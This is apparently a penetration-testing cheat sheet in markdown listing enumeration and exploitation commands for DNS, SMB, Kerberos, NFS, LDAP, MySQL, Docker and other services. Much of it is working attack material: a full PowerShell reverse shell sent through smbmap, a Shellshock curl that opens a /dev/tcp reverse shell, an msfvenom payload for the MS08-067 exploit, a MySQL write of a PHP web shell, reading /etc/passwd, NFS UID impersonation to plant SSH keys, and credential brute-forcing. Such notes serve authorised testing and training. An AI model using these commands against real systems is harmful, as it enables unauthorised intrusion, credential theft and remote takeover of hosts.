### [DNS Recon]
```
dig axfr @<IP> <DOMAINNAME>

Enumerating DNS Records
dnsrecon -d domain

Zone Transfers
host -t ns domain
host -l domain ns.newdomain.xyz

Tools created:
cname_lookup
Usage: ./cname_lookup subdomain.domain.com

zone_xfer
Usage: ./zone_xfer example.com 
```

### [ftp vsftpd-backdoor]
```
nmap --script ftp-vsftpd-backdoor -p 21 <IP>
```

### Sub Domain Takover
https://www.hackerone.com/blog/Guide-Subdomain-Takeovers

### [rpc Enumeration]
```
rpcclient <IP>

rpcclient -U "" <IP>

enumdomusers

queryusergroups <RID>
```

### [rpcinfo]
`rpcinfo <IP>`

### [rpcmap]
```
rpcmap.py 'ncacn_ip_tcp:<ip>'

rpcmap.py 'ncacn_ip_tcp:<ip>' -brute-uuids -brute-opnums -auth-level 1 -opnum-max 5
```

### [rpc enumeration]
https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html

### [SMB Enumeration p445]

### [Enumerate SMB Users]
```
use scanner/smb/smb_enumusers
```

### [SMB to Shell]

```
winexe -U root //<ip> "cmd.exe" --system
```

### [Enumerating basic information from SMB using MSF]
```
use scanner/smb/smb_version
```

SMBClient
```
smbclient //<IP>/share
smbclient '//<IP>/share$'

Retrieving data from share
smbclient //<IP>/share
RECURSE ON
PROMPT OFF
mget *
```

Null Session
```
smbclient -L <IP>
smbclient -L <IP> -U ''
smbclient -L <IP> -U '' -P 'abc'
smbclient -N //IP/Sub
smbclient -L <IP> -U anonymous
smbmap -r -u anonymous -H <IP>
```
SMBv2 Mode
```
smbclient -m SMB2 '//<IP>/c$/path/to/share' -W <WORKSTATION> -U <username>
```

smbmap commands
```
Smbmap -H <ipaddress>
```
```
Smbmap -H <ipaddress> -u <username>
```
```
Smbmap -H <ipaddress> -u <username> -R
```
```
Smbmap -u <username> -d <domain> -p 'password' -H <ipaddress>
```
```
smbmap -u <username> -p <hash> -H <ipaddress>
```
```
smbmap.py -H <ip> -u <username> -p '<password>' -r 'C$\Users'
```

### using smbmap to execute commands, this example shows you how to reverse tcp using powershell.
```
smbmap.py -u <USERNAME> -p '<PASSWORD>' -d ABC -H <TARGETIP> -x 'powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""<LHOST>""""; $port=""""<LPORT>"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
```

Enum4linux
```
enum4linux -a <IP>
```

smbcacls
```
smbcacls -N '//<IP>/Sub' /Users
```

### [Crackmapexec]
```
crackmapexec smb <IP> --shares -u ''

crackmapexec smb <IP> --shares -u '' -p ''

crackmapexec smb <IP> --shares -u 'null'

crackmapexec smb <IP> --shares -u 'null' -p ''

crackmapexec winrm <IP> -u USERNAME -p password

crackmapexec winrm <IP> -u USERNAME -H hash

crackmapexec smb <IP> --pass-pol -u '' -p ''
```

### [smbclient]
```
smbclient.py <IP> -port 445
smbclient.py WORKGROUP/anonymous@IP
login <account>
shares
use <share name>
```

### [SMB VULN Check]
```
nmap -p445 --script smb-vuln-ms17-010 <IP>
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <IP>
```

### [Checking Windows XP for SMB Exploit]
https://github.com/andyacer/ms08_067
```
Before executing the ms08_067 exploit you will need to craft your payload using msf venom and insert your payload into the exploit script.
msfvenom -p windows/shell_reverse_tcp LHOST=<rhost> LPORT=<rport> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

After inserting your shellcode payload then you can execute your script. You may need to change your OS target number depending on the operating system.
python ms08_067_2018.py <rhost> 1 445
```

### [SMB Relay attack]
https://www.youtube.com/watch?v=ctLVMi1_zBc&feature=emb_title

### [Kerberos Enumeration p88]
```
Pre-Auth

GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist

python3 GetNPUsers.py <DOMAIN/ -usersfile /path/to/users.txt -dc-ip <DCIP>
python3 GetNPUsers.py domain.local/ -dc-ip dc-01-server.local -usersfile users.list
python3 GetNPUsers.py <domain_name>/ -dc-ip <DC-IP> -usersfile user.list

Auth

python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```

### [kerbrute]
Kerberos enumeration using kerbrute github.com/ropnop/kerbrute dowwnload the release   
```
kerbrute userenum --dc <IP> -d domain.local -o out_kerbuser.txt users.list
python3 kerbrute.py -users user.list  -passwords pass.txt -domain <domain>
```

### [Generating Passwords Thanks to @Legacyy for suggesting this]
```
hashcat --force passlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout > passwords.txt
```

resources:

https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### [Windows Remote Management WinRM p5985]
https://github.com/Hackplayers/evil-winrm

```
ruby evil-winrm.rb -i <IP> -u <USERNAME> -p '<PASSWORD>' -s '/path/to/scripts/' -e '/path/to/exes/'
```
Download / Upload
```
upload local_filename
download remote_filename
```

### [Mounting NFS]

Display NFS
```
showmount -e IP
```

NMAP command to enumerate NFS  
`nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>`

mount NFS
```
mkdir /tmp/yoursubdirectory
mount -t nfs 0.0.0.0:/subdirectory /tmp/yoursubdirectory
sudo mount -t cifs -o 'user=<USER>,password=<PASSWORD' //<IP>/share /mnt/sharename

Permission Denied Error?
Create the user by typing:
adduser <username>

Set ID to mounted users ID
nano /etc/passwd


or

mkdir home
sudo mount -o nolock <IP>:/home ~/home/
cd home && ls

cd <target_user>
if access is denied then replicate an account with the same UUID.

sudo adduser pwn
sudo sed -i -e 's/1001/1000/g' /etc/passwd


If you have write access to the disk using mount

mount -o rw,vers=2 10.10.10.10:/home /tmp/home

useradd -m <username>

impersonate suid

cd /tmp/home/usersprofile/

mkdir .ssh (If it doesn't exist)

ssh-keygen  -> id_rsa

Create authorized_keys as well and add in your public key

chmod 600 authorized_keys

copy the private key to your attacker box and ssh to the target.

chmod 600 id_rsa

ssh -i id_rsa usersprofile@10.10.10.10 -p 22

done

Cleaning up users when you're done

userdel -f <username>
delgroup <username>
```

unmount NFS
```
sudo umount /mnt
umount -f /tmp/subdirectory
```

### [if profiles can be viewed from smb]
on a folder with profile names type ls > /location/to/output/users.list

### [firewall evasion]
```
nmap -sC -sV -F -D RND:1 host
```

### Useful Resources and Tools

https://gchq.github.io/CyberChef
https://crackstation.net/

Adding your domains to your scope within burp (https://forum.portswigger.net/thread/how-do-i-add-al-subdomains-to-scope-77e3e61a)
```
.*\.test\.com$
```

### [Enumerate SMTP]
```
sudo apt-get install smtp-user-enum
apt-get install ismtp

smtp-user-enum -M VRFY -U users.txt -t <ipaddr>
```

### [ldap]
```
ldapsearch -x -h <IP> -s base namingcontexts
ldapsearch -x -b "dc=domain,dc=com" -H ldap://ipaddr
ldapsearch -x -b "dc=domain,dc=com" -H <ipaddr>
ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
ldapsearch -x -h <ip> -D 'DOMAIN\user' -w 'hash-password'

ldapsearch -h <IP> -x -b "DC=<DC>,DC=local"
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)'
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)' sAMAccountName
ldapsearch -h <IP> -x -b "DC=<DC>,DC=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName

ldapdomaindump <ip> -u 'DOMAIN\user' -p 'hash-password'

nmap -p 389 --script ldap-search <ip>
```
https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/

### [bruteforcing winrm]
https://github.com/mchoji/winrm-brute

```
winrm-brute.rb -U users.txt -P passwords.txt x.x.x.x
```

### [shortname scanning]
https://github.com/irsdl/IIS-ShortName-Scanner
```
java -jar /path/to/IIS-ShortName-Scanner/iis_shortname_scanner.jar 2 20 http://x.x.x.x
/path/to/IIS-ShortName-Scanner/config.xml
```

### [Connecting to mysql]
https://docs.rackspace.com/support/how-to/mysql-connect-to-your-database-remotely/
```
mysql -u username -p -h <IP>

mysql -h ip -u root
mysql -h ip -u root -p
mysql -h ip -u root -p database_name
mysql -u <USERNAME> -p<PASSWORD> -e "use <database>;select * from <tablename>;"

SELECT LOAD_FILE("/etc/passwd")
Select "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'
```
### [Resources]
https://www.youtube.com/watch?v=p4JgIu1mceI  
https://github.com/Tib3rius/AutoRecon  

### nmap vulners
https://github.com/vulnersCom/nmap-vulners
```
nmap -sV --script vulners --script-args mincvss=5.0 <target>
nmap --script http-vulners-regex.nse --script-args paths={"/"} <target> 

nmap -sC -sV -v -p- --script vulners --script-args mincvss=5.0 <target> --min-rate=6000
```

### telnet POP email
```
telnet <IP> 110
USER <username>
PASS <password>

List emails
LIST

Display an email by number
RETR # 
```

### [bloodhound.py]
https://github.com/fox-it/BloodHound.py
```
python3 bloodhound.py -u <USERNAME> -p '<PASSWORD>' -ns <IP> -d domain.local -c all
```

### [postgres]
```
Enumerating Postgres Version:
auxiliary/scanner/postgres/postgres_version

Bruteforce Login:
auxiliary/scanner/postgres/postgres_login

Accessing postress:
psql -h <IPADDRESS> -U postgres
```
Aritcle: https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9

### [Wordpress]
xmlrpc  
https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  

Wordpress Scanning  
`wpscan --url <URL> --enumerate u,vp,vt,cb,dbe --random-user-agent`  

https://blog.wpscan.com/wpscan/cheatsheet/poster/2019/11/05/wpscan-cli-cheat-sheet-poster.html  

### [Pentesting amqp]
https://book.hacktricks.xyz/pentesting/5671-5672-pentesting-amqp

### [Solaris finger enum]
http://pentestmonkey.net/tools/user-enumeration/finger-user-enum

### [Docker Enumeration]
```
curl http://<IP>/version | jq

docker -H <IP>:<HOST> info

docker -H <IP>:<HOST> ps

docker -H <IP>:<HOST> ps -a

docker -H <IP>:<HOST> images
```

### [ShellShock]
```
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" <URL>/x.sh
```

### [Updating NMAP Script Engine]
```
nmap --script-updatedb
```

### [java RMI enumeration]
https://book.hacktricks.xyz/pentesting/1099-pentesting-java-rmi

### [snmp enumeration]
```
snmp-check <IP>
snmp-check <ip> -c public|private|community
```

### [pentesting rtsp]
https://book.hacktricks.xyz/pentesting/554-8554-pentesting-rtsp

### [pentesting mssql]
https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

```
nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -p <port> <ip>

nmap -p 1433 -sU --script=ms-sql-info.nse <ip>

sqsh -S <ip> -U sa
```

### [RDP]

```
nmap -sV --script=rdp-vuln-ms12-020 -p 3389 <ip>
```

```
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <ip>
```

### [rlogin]

```
rlogin -l <username> <ip>
```

### [More Verbosity on version]
```
nmap -sSV --version-intensity 9 <IP>
```

### [ssh bruteforce]
```
use scanner/ssh/ssh_login

You work off a list of usernames and passwords.
```

### [remote registries]
```
reg.py -hashes hash:hash domain.local/username@host query -keyName HKU\\
```

### [heart bleed check]
https://github.com/sensepost/heartbleed-poc
